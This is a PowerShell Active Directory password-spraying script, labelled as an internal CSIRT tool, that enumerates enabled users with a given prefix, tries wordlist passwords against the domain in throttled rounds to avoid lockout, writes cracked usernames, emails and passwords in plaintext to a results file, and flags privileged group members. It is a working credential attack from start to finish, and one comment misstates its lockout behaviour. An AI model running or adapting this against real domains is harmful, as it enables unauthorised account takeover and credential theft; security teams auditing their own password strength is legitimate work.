$Date = Get-Date -Format "MM-dd-yyyy"
$DetailedDate = Get-Date -UFormat "%m/%d/%Y %R"
$UserFilter = "UKE"
$Users = Get-ADUser -Filter "enabled -eq 'True'" -Properties SamAccountName | Sort | Select -ExpandProperty SamAccountName
$PassFile = "passwords.txt"
$PrivGroup = Get-Content "ad_privileged_groups.txt"
$ResultsFile = "scan-results-$date-$UserFilter.txt"
$LogFile = "logs/scan-$Date-$UserFilter.txt"
$UserCounter = 0
$Splitter = "-" * 51
$IncrementValue = 2
$SleepSeconds = 300
$PassWordCount = (Get-Content $PassFile).Count
$UserCount = $Users.Length
$UserTable = @{}


function Write-OutPLog ($NoLine, $Text){
    $Time = Get-Date -Format "HH:mm:ss"
    $Text = "[$Time] $Text"
    $Text.Replace('`r', '') | Add-Content $LogFile
    if(!$NoLine) {
        Write-Host $Text
    }
    else {
        Write-Host -NoNewline $Text
    }
}

function PrivGroup-Check ($user) {
    $PrivGroups = @()
    $Count = 0
    foreach($group in $PrivGroup) {
        $UserCheck = Get-ADGroupMember -Identity $group | Where-Object {$_.name -eq $user}
        Write-Host -NoNewline "`r[*] Checking if $user is part of $group" 
        if($UserCheck) {
            Write-OutPLog -Text "[!] User is part of privileged group: $user, $group"
            $PrivGroups += $group
        }
    }
    return $PrivGroups
}

Write-OutPLog -Text "-----------> OK CSIRT Password Sprayer <-----------"
Write-OutPLog -Text "Date: $DetailedDate"
Write-OutPLog -Text "Usertarget: $UserFilter"
Write-OutPLog -Text "Passwordfile: $PassFile"
Write-OutPLog -Text "Found credentials file: $ResultsFile"
Write-OutPLog -Text "Password increment value: $IncrementValue"
Write-OutPLog -Text "Number of passwords: $PassWordCount"
Write-OutPLog -Text "Number of users: $UserCount"
Write-OutPLog -Text "Time to sleep after each round: $SleepSeconds"
Write-OutPLog -Text $Splitter


Write-OutPLog -Text "[*] Inititalizing domain..."
Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
$ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
$PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($ContextType, $UserDomain)

Write-OutPLog -Text "[*] Creating user dictionary..."
foreach($User in $Users) {
    if($User.SubString(0,3) -eq "UKE") {
        $UserCounter++
        $UserTable.$User = @()
        $UserTable.$User += 0
        $UserTable.$User += ""
    }
}

Write-OutPLog -Text $Splitter
$LastPassValue = $UserTable.Values | Select -Last 1
Write-OutPLog -Text "[!] Starting brute force..."
While($LastPassValue -lt $PassWordCount){
    # The script checks 3 passwords at the same time in order to lock out any users.
    # This while loop ensures that all passwords in the list are checked.x
    :UserLoop foreach ($User in $UserTable.GetEnumerator() | sort -Property name ) {
        # The loop runs for each user in the hashtable.
        $CurrentUser = $User.Name
        if($UserTable[$User.Name][1] -ne 1){
            # The if statement checks if the password of the user has already been found.

            $CurrentPassCount = $User.Value[0]

            1..$IncrementValue | % {
                # Checks a range of X passwords.
                $CurrentPassword = Get-Content $PassFile | Select -Index $CurrentPasscount
                $CurrentPassCount = $CurrentPassCount + 1
                if ($CurrentPassword.Length -gt 7 ){
                    try {
                        $success = $principalContext.ValidateCredentials($CurrentUser, $CurrentPassword)
                    }
                    catch {
                        $success = $False
                        Write-Warning ($_.exception.message -replace '\r?\n' -split '"' -ne '')[-1]
                        Write-OutPLog -Text "Error found: Sleeping for 60 sec..."
                        Start-Sleep -Seconds 60
                        Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
                        $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                        $PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($ContextType, $UserDomain)
                    }
                    if ($success -eq $True)
                        {
                            # If the user is successfully authenticated, this section is called.
                            # Here the information is written to a results file, and a found password tag is added to the user.
                            $UserEmail = Get-AdUser $CurrentUser | Select-Object -ExpandProperty UserPrincipalName
                            $Groups = Get-ADPrincipalGroupMembership $CurrentUser | select name
                            $UserInfo = "$CurrentUser,$UserEmail,$CurrentPassword,$Groups"
                            $UserTable[$User.Name][1] = 1
                            Write-OutPLog -Text "[!] Credentials found: $CurrentUser,$CurrentPassword"
                            $UserInfo | Add-Content $ResultsFile
                            $UserGroups = @()
                            foreach ($Group in $Groups) {
                                $UserGroups += $Group
                                if($Group -in $PrivilegedGroups){
                                    Write-OutPLog -Text "User $CurrentUser is a privileged group member: $Group"
                                }
                                else {
                                    if("$Group".ToLower() -like "*admin*") {
                                        if("$Group" -ne "DS-OFFICE365_OPSJON_IKKEADMINISTRERT") {
                                            Write-OutPLog -Text "User $CurrentUser is member of admin group: $Group"
                                            }
                                        }  
                                        }
                            }
                            $PrincipalContext.Dispose()
                            $PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($ContextType, $UserDomain)
                        }
                 }
             }
            $UserTable[$User.Name][0] = $CurrentPassCount
        }
    }
    Write-OutPLog -Text "[*] Checked : $LastPassValue out of $PassWordCount..."
    Start-Sleep -Seconds $SleepSeconds
}
